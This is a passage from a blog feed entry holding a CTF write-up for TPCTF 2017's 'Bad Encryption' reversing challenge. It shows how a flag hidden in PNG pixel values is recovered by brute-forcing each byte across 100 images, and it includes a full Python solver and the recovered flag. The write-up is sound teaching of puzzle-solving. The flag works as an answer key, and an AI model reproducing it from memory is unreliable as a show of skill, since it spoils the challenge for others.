Image</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">101</span>):</span><br><span class="line">    <span class="keyword">import</span> builtins, random</span><br><span class="line">    img = Image.new(<span class="string">"RGB"</span>, (len(flag), <span class="number">1</span>), <span class="string">"white"</span>)</span><br><span class="line">    pixels = img.load()</span><br><span class="line">    counter = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> character <span class="keyword">in</span> flag:</span><br><span class="line">        character = ord(character)</span><br><span class="line">        rand0 = random.randint(<span class="number">1</span>,<span class="number">256</span>)</span><br><span class="line">        rand1 = random.randint(<span class="number">1</span>,<span class="number">256</span>)</span><br><span class="line">        rand3 = (rand0/<span class="number">256</span>)</span><br><span class="line">        rand4 = (rand1/<span class="number">256</span>)</span><br><span class="line">        rand5 = character*rand3</span><br><span class="line">        rand6 = rand5*rand4</span><br><span class="line">        pixels[counter,<span class="number">0</span>] = (rand0, rand1, round(rand6*<span class="number">10</span>))</span><br><span class="line">        counter += <span class="number">1</span></span><br><span class="line">    img.save(<span class="string">"out"</span>+str(i)+<span class="string">".png"</span>)</span><br></pre></td></tr></table></figure><p>We can see <code>rand0</code> and <code>rand1</code> are being random generated, but they are putted directly into the image in the pixels red and blue!, by having these two we can calculate <code>round(rand6*10)</code> easily by doing some arithmetic operations, with this we can do a script that brute-forces the flag byte by byte, by comparing the blue pixels from the image with the ones we calculated:</p><p>The pseudo code:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">flag = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> character <span class="keyword">in</span> all_printable_characters:</span><br><span class="line">    <span class="keyword">for</span> pixel <span class="keyword">in</span> image:</span><br><span class="line">        rand0 = pixel.red</span><br><span class="line">        rand1 = pixel.blue</span><br><span class="line">        rand3 = rand0/<span class="number">256</span></span><br><span class="line">        rand4 = rand1/<span class="number">256</span></span><br><span class="line">        rand5 = ord(character)*rand3</span><br><span class="line">        rand6 = rand5*rand4</span><br><span class="line">        <span class="keyword">if</span> rand6 == pixel.blue:</span><br><span class="line">            flag += character</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure></p><p>But we ran into a problem, as the description of the challenge says sometimes the <strong>encryption doesn’t work</strong> and one of the reasons is the calculations made by the <code>rand</code> variables can be <strong>above 255</strong> (Kind of depends of the random value or the character), we know that color pixels from the images can only handle colors in the range of 0-255 (in this case python will set the pixel as 255), a byte! </p><p>This why the encryption does it multiple times (100) with different random values, another problem we have is once in a while <strong>multiple characters matches the same blue pixel</strong>, in these both cases we can’t know for sure if it is the character we want.</p><p>So my solution to this was to ignore all characters that were <strong>above 255</strong> and those that had <strong>multiple solutions</strong> to that <strong>byte position</strong> of the flag, since we have more than enough images (100) the characters we failed to find we can recheck them in the rest of the pictures.</p><p>The final python script I used was (note that using python3 in this challenge was absolutely necessary):</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os, sys</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="comment"># flag size is 38</span></span><br><span class="line">flags = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">101</span>):</span><br><span class="line">    flag = []</span><br><span class="line">    im = Image.open(<span class="string">"out%d.png"</span>%i)</span><br><span class="line">    width = im.size[<span class="number">0</span>] <span class="comment">#define W and H</span></span><br><span class="line">    height = im.size[<span class="number">1</span>]</span><br><span class="line">    pix = im.load()</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">0</span>,width):</span><br><span class="line">        stop = <span class="keyword">True</span></span><br><span class="line">        found = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> character <span class="keyword">in</span> string.printable:</span><br><span class="line">            r,g,b = pix[x,<span class="number">0</span>]</span><br><span class="line">            rand0 = r</span><br><span class="line">            rand1 = g</span><br><span class="line">            rand3 = rand0/<span class="number">256</span></span><br><span class="line">            rand4 = rand1/<span class="number">256</span></span><br><span class="line">            rand5 = ord(character)*rand3</span><br><span class="line">            rand6 = rand5*rand4</span><br><span class="line">            <span class="keyword">if</span> round(rand6*<span class="number">10</span>) &gt;= <span class="number">255</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">if</span> round(rand6*<span class="number">10</span>) == b:</span><br><span class="line">                    found += <span class="number">1</span></span><br><span class="line">                    stop = <span class="keyword">False</span></span><br><span class="line">                    <span class="keyword">if</span> found == <span class="number">1</span>:</span><br><span class="line">                        flag.append(character)</span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        flag[x] = <span class="string">'x'</span></span><br><span class="line">        <span class="keyword">if</span> stop:</span><br><span class="line">            flag.append(<span class="string">'x'</span>)</span><br><span class="line">    flags.append(<span class="string">''</span>.join(flag))</span><br><span class="line"></span><br><span class="line">final_flag = list(<span class="string">'xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx'</span>)</span><br><span class="line"><span class="keyword">for</span> flag <span class="keyword">in</span> flags:</span><br><span class="line">    <span class="keyword">for</span> i,c <span class="keyword">in</span> enumerate(flag):</span><br><span class="line">        <span class="keyword">if</span> c != <span class="string">'x'</span>: </span><br><span class="line">            final_flag[i] = c</span><br><span class="line"><span class="keyword">print</span> (<span class="string">''</span>.join(final_flag))</span><br></pre></td></tr></table></figure><p>Running it</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python3 reverse.py</span><br><span class="line">tpctf&#123;i_c4nt_7h1nk_0f_a_fUnny_f14g_:(&#125;</span><br></pre></td></tr></table></figure><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;&lt;br&gt;Bad Encryption&lt;br&gt;100&lt;br&gt;&lt;br&gt;I was making an encryption program, but it is far from perfect. Instead of make the encryption 
      
    
    </summary>
    
      <category term="Reverse" scheme="https://teamrocketist.github.io/categories/Reverse/"/>
    
    
      <category term="bruteforce" scheme="https://teamrocketist.github.io/tags/bruteforce/"/>
    
      <category term="reverse" scheme="https://teamrocketist.github.io/tags/reverse/"/>
    
      <category term="tpctf2017" scheme="https://teamrocketist.github.io/tags/tpctf2017/"/>
    
      <category term="bytebybyte" scheme="https://teamrocketist.github.io/tags/bytebybyte/"/>
    
      <category term="python3" scheme="https://teamrocketist.github.io/tags/python3/"/>
    
  </entry>
  
</feed>
